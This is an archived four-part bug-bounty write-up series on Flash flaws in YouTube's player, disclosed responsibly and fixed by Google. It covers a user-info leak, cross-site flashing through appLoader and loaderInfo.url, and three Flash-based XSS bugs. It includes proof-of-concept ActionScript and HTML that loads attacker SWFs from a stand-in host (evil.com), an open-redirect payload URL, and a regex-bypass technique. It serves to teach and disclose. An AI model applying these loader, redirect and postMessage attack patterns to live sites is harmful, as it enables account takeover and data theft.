---
type: Article
title: Advanced Flash Vulnerabilities in Youtube (Parts 1–4)
description: "Series on Flash flaws in YouTube's player: an information leak, arbitrary Flash execution on youtube.com through the app loader, cross-site flashing by redefining loaderInfo.url so the main movie loads an attacker-supplied module, and three Flash-based cross-site scripting bugs in the iframe API's Flash fallback."
resource: "https://opnsec.com/category/flash/"
tags: [article, webseclist-reference, opnsec, flash, xss, sop-bypass, info-leak, bug-bounty, owasp-a01-2021, owasp-a03-2021]
generated:
  by: webseclist-refs/1
  at: "2026-09-10T01:11:54+00:00"
status: stable
stale_after: 2027-09-10
sources:
  - id: original
    resource: "https://opnsec.com/category/flash/"
    title: Advanced Flash Vulnerabilities in Youtube (Parts 1–4)
    author: OpnSec
    last_modified: 2017-08-25
also_at: []
authors:
  - OpnSec
canonical_url: ""
cited_by:
  - "2016-17.md:12"
commit: ""
content_sha256: 7eafcb963656220507ff23d1ef0c1c92705680877040d24cc9f83835365e21fe
depth: full
depth_reason: default
kind: article
language: ""
licence: unknown
original_url: "https://opnsec.com/category/flash/"
published: 2017-08-25
publisher: OpnSec
publisher_english: ""
raw_sha256: d2f42a31857560589b8f6a925269d930e01c7a7908dfa86fa00d4876904a25e8
retrieved_from: "https://opnsec.com/category/flash/"
retrieved_kind: manual-import
retrieved_utc: "2026-09-10T01:11:54+00:00"
slug: 2017-opnsec-advanced-flash-vulnerabilities-youtube-parts-14
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Advanced Flash Vulnerabilities in Youtube (Parts 1–4)

**Advanced Flash Vulnerabilities in Youtube (Parts 1–4)** - OpnSec, OpnSec.

- Published: 2017-08-25
- Original: <https://opnsec.com/category/flash/>
- Preserved from: https://opnsec.com/category/flash/ (manual-import) on 2026-09-10
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

> Archive note: This citation points to the Flash category index. The four complete original articles linked from that index are preserved below in series order, recovered from OpnSec. The article publication dates run from August 25 to September 13, 2017; the current source metadata records later modification on July 30, 2021.

## Advanced Flash Vulnerabilities in Youtube – Part 1

Source: https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/

### Why Flash Security still matters?

Flash is still an active threat. In 2017, I reported Flash vulnerabilities to Facebook, Youtube, WordPress, Yahoo, Paypal and Stripe. Over the last 3 years, I reported more than 50 Flash vulnerabilities to Bug Bounty programs. And there are many more I didn’t have the time to report or that weren’t fixed after I reported it.

![1uureg-300x184](../../figures/2016-17/opnsec-com-flash-opnsec/1uureg-300x184.png)  
In addition, Flash has been replaced by new javascript/html5 features. These features introduce complexity and new kind of vulnerabilities like bad CORS implementation, DOM XSSes triggered by postMessage or XHR requests, active mixed content… Learning from Flash mistakes can help design and implement more secure javascript applications. The new Youtube html5 Api is mostly a porting of the Youtube Flash Api to javascript, making it interesting to study. In fact, I was able to find XSSes in the Youtube html5 Api using my knowledge of the Flash Api.  
I’ll explain some advanced Flash vulnerabilities I found in Youtube Flash Api and in the process I will draw a parallel with html/javascript security. This is quite technical so feel free to comment or to tweet me ([@opnsec](https://twitter.com/opnsec)) if something is not clear or if you want to add something. You can also read more about Flash security model [here](http://www.senocular.com/flash/tutorials/contentdomains/).

## Reverse engineering Youtube Flash Api

Youtube Flash Api allows developers to embed a Youtube video in an external website.  
Here is the workflow of the Api:

[![Diagramme1](../../figures/2016-17/opnsec-com-flash-opnsec/Diagramme1.png)](https://opnsec.com/wp-content/uploads/2017/08/Diagramme1.svg)

The entry point, Youtube Wrapper, is a Flash file located at youtube.com/v/[VIDEO_ID], it is just a wrapper between the HTML page and the Main App.  
The Main Application is a large flash file of about 100k LoC and is located in a sandboxed domain s.ytimg.com.  
The Modules handle optional functions like subtitles or advertisements. They are not stand-alone Flash files and can only be loaded by the Main App.

In addition there is a Flash to Javascript Api that allows the html page to send commands to the Youtube Api like play(), pause(), etc… Flash files will also perform “ajax style” cross-domain requests to load configuration files and video data.

## I. User info leakage

Let’s start with a simple vulnerability. Here is a simplified version of Youtube Wrapper code in Flash ActionScript3 (AS3) :



```
public class YoutubeWrapper extends Sprite{

private var user_name = "The Victim";

private var user_picture = "https://googleusercontent.com/.../victim_photo.jpg";

private var appLoader = new Loader();

public function YoutubeWrapper(){

// allow external javascript/Flash files to access its public properties

Security.allowDomain("*");

// load the Main App

this.appLoader .load(new URLRequest("https://s.ytimg.com/.../watch_as3.swf");

// add as child of display container

this.addChild(this.appLoader );

// loaderInfo.sharedEvents Api

this.loader.contentLoaderInfo.sharedEvents

.addEventListener("REQUEST_USERINFO", this.onRequestUserinfo);

}

private function onRequestUserinfo(event:Event){

// write the user info into the event.data property

// which is accessible to the sharedEvents caller

event.data.user_name = this.user_name;

event.data.user_image = this.user_image;

}

}
```



Youtube Wrapper is generated on the fly and its property “user_name” contains the Google user name (if he is connected to Google). The property “user_picture” contains the link to the user profile picture. In this bug, the attacker will steal these values.

Youtube Wrapper can be loaded from the developer own Flash file (let’s call it Evil Wrapper). In that case, they both executes in a different Flash security sandbox.

> Loading an external Flash file in Flash is a little bit similar to loading an `<iframe>` in html. If the iframe is from a different origin than its parent, they cannot access each other properties due to the Same-Origin Policy (SOP)

Youtube Wrapper contains the code [Security.allowDomain(“\*”)](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Security.html#allowDomain()) to allow javascript on the hosting webpage to send commands to the Flash app like play(), pause(),etc… This also means that Evil Wrapper can access any public property of Youtube Wrapper as if it was in the same Security sandbox. However it cannot access private properties.

The user_name property is private so Evil Wrapper cannot access it.

Flash also provides an Api for communication between a Loader and a loaded file using [loaderInfo.sharedEvents](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/LoaderInfo.html#sharedEvents). Youtube Wrapper uses this api to communicate with the Main App. When the Main App dispatches an event to the sharedEvents Api, the Youtube Wrapper receives the event and send back the user info using the event.data property.  
loaderInfo.sharedEvents is not only accessible to the loader and the loaded files, but also to any Flash file that has a reference to this loaderInfo object.

> This is similar to the javascript [postMessage Api](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) which allows communication between cross-domain iframes. The postMessage Api is accessible not only to the iframe and its parent but also to any other window that has a reference to the iframe or the parent. Any arbitrary domain can access these references using window.open and window.frames, which are not restricted by the SOP.

If Evil loader can access this particular loaderInfo object it will be able to send an event to the Youtube Wrapper and steal the user info.  
loaderInfo is a property of appLoader which is a private property of the Youtube Wrapper, so Evil Wrapper cannot access it.

However, when using a Loader, if you want to display the loaded file, you have to add it as a child of the Display Container. This is usually done using  
this.[addChild](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/DisplayObjectContainer.html#addChild())(this.loader); and this is exactly what the Youtube Wrapper does.  
The thing is that the Youtube Wrapper also have a built-in public method [getChildAt](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/DisplayObjectContainer.html#getChildAt())() that will return the children of the Youtube Wrapper. This means that Evil Wrapper can call YoutubeWrapper.getChildAt(0) which will return the loader object, bypassing the privacy of the loader property.

> Setting a property as “private” is called [encapsulation](https://en.wikipedia.org/wiki/Encapsulation_(computer_programming)). However, only the reference is private, not the object the reference points to.

From there Evil Wrapper can access YoutubeWrapper.getChildAt(0).loaderInfo.sharedEvents which is the interface between Youtube Wrapper and the Main App. Evil Wrapper can send an event to the Youtube Wrapper, the Youtube Wrapper will provide the user info in the event.data property and Evil Wrapper can then read the event.data value.  
Proof of Concept :

Evil Wrapper code was like this



```
var loader = new Loader();

// Load the Youtube Wrapper

loader.load(new URLRequest("https://www.youtube.com/v/[VIDEO_ID]"));

var youtubeWrapper = loader.content;

// Access the Youtube Wrapper appLoader object

var appLoader = youtubeWrapper.getChildAt(0);

// Access the loaderInfo.sharedEvents of appLoader

var LeakingSharedEvents = appLoader.contentLoaderInfo.sharedEvents;

// Prepare the event to send to Youtube Wrapper

var leakEvent = new Event("Request_username");

leakEvent.data = new Object();

// Send the leakEvent to the LeakingSharedEvents

LeakingSharedEvents.dispatchEvent(leakEvent);

// The username is now accessible in the event.data property

trace(leakEvent.data.user_name);

trace(leakEvent.data.user_picture);
```



POC workflow :

![Diagramme2](../../figures/2016-17/opnsec-com-flash-opnsec/Diagramme2.png)  
Attack scenario:  
Prerequisite: The victim is logged in Google and have Flash player  
(1) The victim visits the attacker webpage evil.com/evil.html which contains a Flash object evil.com/evil.swf  
(2) evil.swf loads Youtube wrapper (https://www.youtube.com/v/[VIDEO_ID]) and retrieves the user Google username (4-5-6)  
evil.com now knows the username of it’s visitors. In addition, as the profile picture link is unique, it is possible to uniquely identify the user’s Google account.

Impact:  
Any website could use this to know the identity of it’s users, if they are connected to Google. Imagine how you would feel if you visit a random website and this website displays your name and your picture!

Mitigation:  
To resolve this issue, Youtube Wrapper stopped writing the user info in the event.data property and instead sends it directly to the Main App. That way even if Evil Wrapper sends an event to Youtube Wrapper, it wouldn’t receive the user info as it would be directly sent to the Main App.

Timeline:  
08/27/2015 – reported to Google VRP  
09/09/2015 – issue fixed and reward ![1-star](../../figures/2016-17/opnsec-com-flash-opnsec/1-star.png)  
This was a simple bug and I hope it helps you understand the basic challenges here. You can read about another bug where we actually execute arbitrary Flash code in youtube.com in [**Part 2**](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/).

---

## Advanced Flash Vulnerabilities in Youtube – Part 2

Source: https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/

### II. XSF via appLoader

In [**Part 1**](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/), I introduced an information leakage vulnerability in Youtube. In this part I will disclose a more severe vulnerability that allows arbitrary Flash code execution in youtube.com.  
This type of vulnerability is very similar to XSS except we execute Flash code instead of Javascript. It is called Cross-Site Flashing (XSF) or Same-Origin Policy Bypass using Flash.

It will get a little bit more complex, you can read more about Flash security model [here](http://www.senocular.com/flash/tutorials/contentdomains/).

Let’s have a look at the Youtube Flash Api, this time showing the security sandboxes.

![Diagramme6](../../figures/2016-17/opnsec-com-flash-opnsec/Diagramme6.png)

A [Loader](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/Loader.html) object can load an external Flash file in 2 ways :

(1) In the normal way, the 2 Flash files are in separate Security Sandboxes (like with `<iframe>` in html)

(2) If the loader uses the argument “[SecurityDomain.currentDomain](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/SecurityDomain.html)“, the **loaded Flash file will execute in the loader security sandbox** (similar to `<script src=””>` in html, which is very different than loading an `<iframe>`!). This is how the Main App loads the Modules.  
Note: don’t be fooled by the fact that the Main App and Modules files are both located in the same domain s.ytimg.com, this is not the reason why they are in the same security sandbox here, but because the Main App uses the argument “[SecurityDomain.currentDomain](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/SecurityDomain.html)” to load Modules.

We already saw in Part 1 a technique to access the Youtube appLoader property using youtubeWrapper.getChildAt(0). This time we will use appLoader to load another external file into Youtube security sandbox using appLoader.load(“evil.com/evil2.swf”, SecurityDomain.currentDomain).

Here is the POC workflow

[![Diagramme3](../../figures/2016-17/opnsec-com-flash-opnsec/Diagramme3.png)](https://opnsec.com/wp-content/uploads/2017/08/Diagramme3.svg)

And the POC code:



```
var loader = new Loader();

// Load the Youtube Wrapper (1)

loader.load(new URLRequest("https://www.youtube.com/v/[VIDEO_ID]"));

var youtubeWrapper = loader.content;

// Access the Youtube Wrapper appLoader object (3)

var appLoader = youtubeWrapper.getChildAt(0);

// Load evil2.swf in youtubeWrapper security sandbox. (4)

appLoader.load(new URLRequest("http://evil.com/evil2.swf"), new LoaderContext(false, ApplicationDomain.currentDomain, SecurityDomain.currentDomain));

// evil2.swf can execute arbitrary code in youtube.com security sandbox (5)
```



Technical details:  
SecurityDomain.currentDomain is a relative value, since it’s apply to the **current** Security Sandbox. Flash documentation states that it is the security sandbox of the file where the instruction is written. Nice and easy, however, it is proven to be more complex here.

appLoader is instantiated in Youtube Wrapper, but the call to appLoader.load(evil.com/evil2.swf, SecurityDomain.currentDomain ) is written in evil.swf. So evil2.swf should normally load in evil.swf security sandbox. If you debug the Flash execution, this is what is happening first (when looking for crossdomain.xml file). But at the last moment, because appLoader was instantiated in Youtube Wrapper, evil2.swf will actually execute in Youtube security sandbox.

Once evil.com/evil2.swf is loaded in Youtube security sandbox, the Flash Player will treat it like if it was located at https://www.youtube.com/v/xxx/[[IMPORT]]/http://evil.com/evil2.swf.  
This means that evil2.swf can send request to any https://www.youtube.com/ URL and read response source code using [URLLoader](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/URLLoader.html).

> URLLoader is similar to [XHR](https://developer.mozilla.org/en/docs/Web/API/XMLHttpRequest) in javascript.

Impact:  
Using this vulnerability, an attacker could access any private data on the victim’s Youtube account. It could access private videos, post comments on behalf of the victim or delete all the victim’s videos. The impact is similar to a reflective XSS on youtube.com.

Attack scenario:  
Prerequisite : The victim is logged in Youtube and have Flash active  
1 The victim visits http://evil.com/evil.html  
2 The attacker has control over the victim’s Youtube account

Timeline:  
05/20/2016 – reported to Google VRP  
05/20/2016 – “Nice catch” from Google  
05/24/2016 – reward![2-stars](../../figures/2016-17/opnsec-com-flash-opnsec/2-stars.png)  
06/07/2016 – Issue fixed and verified  
   
Conclusion:  
Security Sandbox is a great tool but it is complex and implemented deep inside the core language, making it difficult for developers to predict the exact behavior for edge cases (in particular if the language is not open source). Always be careful when using it.  
   
In [**Part 3**](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/), I will disclose another XSF and show how Flash vulnerability can be even more dangerous than XSS in some cases.

---

## Advanced Flash Vulnerabilities in Youtube – Part 3

Source: https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/

### III. XSF via loaderinfo.url redefinition

Let’s have a look at how the Main App loads the Modules :

[![Diagramme7](../../figures/2016-17/opnsec-com-flash-opnsec/Diagramme7.png)](https://opnsec.com/wp-content/uploads/2017/08/Diagramme7.svg)

The url of the module is dynamically generated by the main app by using it’s own url (2) and replacing the filename (watch_as3.swf) by the module filename (subtitles.swf) (3). This allows to handle multiple versions on the Main App, each one with it’s own Modules location.

To find it’s own url, the main app uses the [loaderinfo.url](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/LoaderInfo.html#url) property of appLoader.

> Since appLoader is similar to an `<iframe>` in html, appLoader.loaderInfo.url is similar to the “src” attribute of the iframe.

In flash a Loader can load multiple swf files while in html an iframe can only load one window at a time

This means that if appLoader first loads the Main App and then immediately loads another Flash file the loaderinfo.url property of the Main app will not reflect the url of the Main App but instead the url of the other loaded flash file.  
POC workflow

[![Diagramme5](../../figures/2016-17/opnsec-com-flash-opnsec/Diagramme5.png)](https://opnsec.com/wp-content/uploads/2017/08/Diagramme5.svg)

We removed Youtube Wrapper and replaced it with Evil Wrapper. Evil Wrapper will first load the Main App (1), and then immediately load another file (Noop.swf) with the same Loader appLoader (2). When the Main app will try to load a Module, it will get the appLoader url value (3) (evil.com/Noop.swf), replace the filename with the module name (evil.com/subtitles.swf) and load an arbitrary Flash file into it own Flash security sandbox (4).

From there Evil Module will be in the Main App Security Sandbox and will appear to be located at s.ytimg.com/[[IMPORT]]/evil.com/subtitles.swf. However, s.ytimg.com is a sandboxed domain which doesn’t have any cookie, CSRF token or webpage to exploit.

In [part 2](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/) I introduced URLLoader, which is similar to XHR. You can make cross-domain requests with URLLoader if the remote server has a crossdomain.xml file allowing “s.ytimg.com”

> crossdomain.xml mechanism is similar to CORS headers for XHR cross-domain requests in javascript

The good news is that <https://www.youtube.com/crossdomain.xml> does allow https://s.ytimg.com/. Even more, <https://drive.google.com/crossdomain.xml>, <https://docs.google.com/crossdomain.xml> and [other google domains](https://clients6.google.com/crossdomain.xml) also allow https://s.ytimg.com/.

This means that Evil Module can send requests to any URL at youtube.com, drive.google.com and docs.google.com (including POST requests and custom headers) and read the response source code (5).  
Attack scenario:  
1. The victim is logged in Youtube or Google Drive and has Flash player  
2. The victim visits the attacker evil.com/evil.html page which contains a Flash object evil.com/evil.swf  
3. The attacker has control over the victim’s Youtube, Google Drive and Google Docs accounts

Impact:  
The attacker can steal private information, CSRF tokens and perform any CSRF action on these domains. A very nasty exploit could steal and delete all the victim Google Drive files and then post the POC url on Youtube comments from the victim account to spread the exploit. I won’t provide such POC (I would like to safely return to DefCon next year…) but it would only take about 20 LOC to build it!

Timeline:  
09/11/2015 – reported to Google VRP  
09/16/2015 – “Nice catch” from Google  
09/25/2015 – Temporary mitigation and reward![3-stars](../../figures/2016-17/opnsec-com-flash-opnsec/3-stars.png)  
10/14/2015 – Issue fixed and verified

Conclusion:  
When using a sandboxed domain for hosting untrusted applications, like s.ytimg.com, you should always make sure that the sandboxed domain has no privilege on sensitive domains, like crossdomain.xml files, CORS, framing or CSP.

[**UPDATED**] **[Part 4](https://opnsec.com/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/)** is now online with 3 Flash based XSS on Youtube!

You can also see a live Flash based XSS on twitter [here](https://opnsec.com/twitter/photo.html)

---

## Advanced Flash Vulnerabilities in Youtube – Part 4

Source: https://opnsec.com/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/

### IV. Flash based XSSes on Youtube iframe api

I’m happy that people found my [previous posts on Youtube Flash vulnerabilities](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/) interesting, and I will keep posting new write-ups.  
This time I will disclose 3 Flash based XSSes on the new Youtube html5 api (with Flash fallback).

Youtube html5 api is called [Youtube iframe api](https://developers.google.com/youtube/iframe_api_reference), because the entry point is an iframe located at youtube.com/embed/[VIDEO_ID].  
When the iframe loads, it will first check if the browser is able to play videos using html5, and if not it will use the Flash fallback. Until recently, it was possible to force the Flash fallback for all browsers using the URL parameter nohtml5=1. This is what we will do here.

Here is the workflow of the Youtube iframe api with Flash fallback:

[![Diagramme8](../../figures/2016-17/opnsec-com-flash-opnsec/Diagramme8.png)](https://opnsec.com/wp-content/uploads/2017/09/Diagramme8.svg)

If you compare with the workflow of the Youtube Flash api in [part 1](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/), the Flash file “Youtube Wrapper” has been replaced by the iframe “Youtube Embed”, and consequently Flash to javascript api has been replaced by postMessage api and sharedEvent api has been replaced by Flash to javascript api. This should give you a sense of how Flash and javascript are very similar, only the implementation is different.

> Youtube Flash api and Youtube iframe api are so similar that [Firefox](https://bugzilla.mozilla.org/show_bug.cgi?format=default&id=769117) , [Chrome](https://groups.google.com/a/chromium.org/forum/#!msg/chromium-dev/BW8g1iB0jLs/uddWuBroBAAJ) and [Safari](https://github.com/WebKit/webkit/blob/master/Source/WebCore/Modules/plugins/YouTubePluginReplacement.cpp) have implemented an interesting/weird [behaviour](https://github.com/whatwg/html/issues/2390) where any `<object data=”youtube.com/v/[VIDEO_ID]”>` (Youtube Flash api) will be automatically replaced by `<object data=”youtube.com/embed/[VIDEO_ID]”>`(Youtube iframe api) where the `<object>` will actually behave as an iframe. The objective is to force old websites to switch to Youtube iframe api without making any change in the websites themselves.

To trigger a Flash based XSS on youtube.com, you have to either load a Flash file located at youtube.com directly from the address bar, or exploit any Flash file embed in a html page located at youtube.com. Here we will exploit the Flash file “Main App” which is embed in youtube.com/embed, and from there we will execute arbitrary javascript on youtube.com/embed.  
When an external website embeds a Youtube iframe, it can send [commands](https://developers.google.com/youtube/iframe_api_reference#Functions) to the Youtube iframe using the postMessage api such as playVideo(), pauseVideo(), etc… The Youtube iframe will then transmit the command to the Flash Main App (using the Flash to javascript api).

### 1. Flash based XSS using loadPlaylist command

One particular command is [loadPlaylist()](https://developers.google.com/youtube/iframe_api_reference#loadPlaylist) which will make the Youtube iframe load a playlist. The argument of loadPlaylist() can either be a Youtube playlist ID or an array of Youtube video IDs. When using an array of Youtube video IDs, it is possible to inject arbitrary poster (thumbnail) image url for each video.  
Loading an image in Flash is similar to loading an external Flash file using Loader.load(), so we could load an arbitrary Flash file using this. Main App checks if the url of the poster image is a youtube.com url and then loads the image. Now you might be aware that Google doesn’t believe that open redirections are security issues! This makes url sanitization very difficult, because you just need to provide a youtube.com url that will redirect to an arbitrary location. I didn’t find an open redirector directly on youtube.com. However, I found a youtube.com url that will redirect to any google.com url. From there it was easy to find an open redirector on google.com that would redirect to evil.com. The full url payload was 

```
https://accounts.youtube.com/accounts/SetSID?continue=https://www.google.com/amp/s/evil.com/evil.swf
```

  
Once evil.swf is loaded on youtube.com/embed it can execute arbitrary javascript using the Flash to javascript api, which means XSS on youtube.com!

> Note: By default only Flash file located on the same domain than the html host page can use the Flash to javascript api. But in youtube.com/embed/[VIDEO_ID] the Main App `<object>` tag contains the attribute “[allowscriptaccess=always](https://helpx.adobe.com/flash/kb/control-access-scripts-host-web.html)” which means that any Flash file loaded by the Main App will be able to use the Flash to javascript api on youtube.com/embed/[VIDEO_ID]

Here is the workflow of the POC:

[![Diagramme9](../../figures/2016-17/opnsec-com-flash-opnsec/Diagramme9.png)](https://opnsec.com/wp-content/uploads/2017/09/Diagramme9.svg)

evil.com/evil.html source code:



```
<!DOCTYPE html>

<html>

<body>

<!-- Youtube iframe api with forced Flash fallback -->

<iframe id="player" src="https://www.youtube.com/embed/?nohtml5=1"></iframe>

<script>

// Wait 5 seconds to let the Youtube iframe fully load

setTimeout(

function(){

// Send the loadPlaylist command to the Youtube iframe using postMessage api, with the image payload

document.getElementById("player").contentWindow.postMessage('{"command":"loadPlaylist","data":[{"video_id":"xyz","iurl":"https://accounts.youtube.com/accounts/SetSID?continue=https%3A%2F%2Fwww.google.com%2Famp%2Fs%2Fevil.com%2Fevil.swf"}]}', "*");

}

, 5000);

</script>

</body>

</html>
```



evil.swf source code:



```
public class Main extends Sprite {

public function Main(){

// Execute arbitrary javascript on youtube.com/embed using ExternalInterface (Flash to javascript api)

ExternalInterface.call("alert", "document.domain + ' XSSed!'");

}

}
```



Attack Scenario:  
Prerequisite: The victim has Flash Player enabled  
1. The victim visits evil.com/evil.html  
2. evil.html loads youtube.com/embed iframe  
3. evil.html sends the loadPlaylist payload  
4. youtube.com/embed loads evil.swf  
5. evil.swf execute XSS on youtube.com/embed

Mitigation:  
Google patched the Main App so that it doesn’t take picture url into account in loadPlaylist arguments.

Timeline:  
10/05/2016 Reported to Google  
10/11/2016 “Nice catch” and reward![2-stars](../../figures/2016-17/opnsec-com-flash-opnsec/2-stars.png)  
11/09/2016 Bug fixed and verified

### 2. Flash based XSS using trustedLoader Regex

In addition to public commands like playVideo() or loadPlaylist(), Youtube api has private commands that are available only if the webpage that loads the Youtube iframe is from a verified, trusted origin (like youtube.com or drive.google.com/xxx). To do this, the Main App uses a whitelist stored in a regex. The regex is like this :  


```
public static const trustedLoader:RegExp = new RegExp("^https?://((www\.|encrypted\.)?google(\.com|\.co)?\.[a-z]{2,3}/(search|webhp)\?|24e12c4a-a-95274a9c-s-sites.googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf|www\.gstatic\.com/doubleclick/studio/innovation/h5/layouts/tetris|tpc\.googlesyndication\.com/safeframe/|lightbox-(demos|builder)\.appspot\.com/|([A-Za-z0-9-]{1,63}\.)*(imasdk\.googleapis\.com|corp\.google\.com|borg\.google\.com|docs\.google\.com|drive\.google\.com|googleads\.g\.doubleclick\.net|googleplex\.com|play\.google\.com|prod\.google\.com|sandbox\.google\.com|photos\.google\.com|picasaweb\.google\.com|lh2\.google\.com|plus\.google\.com|books\.googleusercontent\.com|mail\.google\.com|talkgadget\.google\.com|survey\.g\.doubleclick\.net|youtube\.com|youtube\.googleapis\.com|youtube-nocookie\.com|youtubeeducation\.com|vevo\.com)(:[0-9]+)?([\/\?\#]|$))");
```



> Before reading more, you should check the regex yourself and try to find the mistake in it!

“.” (dot) is a wildcard in Regex, which means it will match any character. If you only want to match a literal dot, you have to escape it like this “\.”  
In trustedLoader RegExp, we have this code : 

```
24e12c4a-a-95274a9c-s-sites.googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf
```

  
where the dots are not escaped. This means that we can replace the dots by any character and it will still match the Regex.  
in particular, http://24e12c4a-a-95274a9c-s-sites**A**googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf will match the regex, and this domain is not owned by Google. It was available so I bought it for 1$! (You could use any alphanumeric character instead of A)  
I hosted a html page at http://24e12c4a-a-95274a9c-s-sites**A**googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf that will load a Youtube iframe and I have access to the private commands of the Youtube api.

Among the private commands there is a function updateVideoData(), that allows you to inject an arbitrary Flash file as a poster image exactly like with loadPlaylist() before. I won’t go into details as the rest of the report is similar to previous one.

Mitigation:  
Google patched trustedLoader Regex to properly escape dots like this 24e12c4a-a-95274a9c-s-sites\.googlegroups\.com/a/google\.com/flash-api-test-harness/apiharness\.swf

Timeline:  
11/22/2016 Report to Google  
11/29/2016 Reward![2-stars](../../figures/2016-17/opnsec-com-flash-opnsec/2-stars.png)  
01/18/2017 Issue fixed and verified

### 3. Flash based XSS using trustedLoader regex… again!

Let’s have a look at the trustedLoader regex again. There are still problems with it! For example 

```
google(\.com|\.co)?\.[a-z]{2,3}
```

 is not a secure way to check that a domain is a Google owned domain because 

```
google.com.fun
```

 for example will match the regex but is not a Google owned domain.  
Let’s take another example: 

```
www\.gstatic\.com/doubleclick/studio/innovation/h5/layouts/tetris
```

 is consider a trusted url. But there are XSSes in other www.gstatic.com webpages, and from there we can execute arbitrary javascript on www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris and then load a Youtube iframe, send a updateVideoData() command and execute XSS on youtube.com/embed.

Let’s make a drawing of the attack workflow:

[![Diagramme10](../../figures/2016-17/opnsec-com-flash-opnsec/Diagramme10.png)](https://opnsec.com/wp-content/uploads/2017/09/Diagramme10.svg)

Technical details:  
Prerequisite: The victim has Flash Player and opens www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf?chartId=[arbitrary javascript]  
1. The arbitrary javascript makes www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf load an iframe at https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris  
2-3-4. The arbitrary javascript makes https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris load an iframe at youtube.com/embed  
5. The arbitrary javascript sends a updateVideoData() command to Youtube iframe  
6. Youtube iframe accepts the command because https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris is a trusted loader, and transmits it to Main App  
7. Main App loads arbitrary Flash file (the open redirection was different this time because previous one was fixed)  
8. Evil Flash file executes XSS on youtube.com/embed

Mitigation:  
Youtube removed the option nohtml5=1 to force the Flash fallback. There are still similar vulnerabilities but they are now limited to browsers that can’t play video using html5. This is typically very old browsers that are out of scope for Bug Bounty programs.

Timeline:  
02/02/2017 Report to Google  
02/02/2017 “Nice catch” from Eduardo, who also advised me to apply to [Google Research Grants](https://www.google.com/about/appsecurity/research-grants/) program  
02/14/2017 Reward ![3-stars](../../figures/2016-17/opnsec-com-flash-opnsec/3-stars.png)  
04/11/2017 Issue fixed and verified

Conclusion:  
You can see that Flash and javascript are very similar and can be used together or you can replace one by the other. The same is true for Flash security and javascript security, this is why I think it is useful to learn about Flash implementation vulnerabilities in order to build more secure javascript applications (especially when there is a Flash fallback). You can also see that Flash based XSS are very similar to DOM XSSes is the sense that they only reveal during code execution and cannot be caught by Web Application Firewalls, browser based mitigation like XSS auditor or even vulnerability scanners.

Thank you very much for reading, and I also want to thank Google VRP team because you are really doing an amazing work!

In the future I will disclose more mixed javascript/Flash bugs from Youtube, Facebook, WordPress and others, and slowly we will get rid of Flash and I will disclose pure javascript vulnerabilities on those domains.
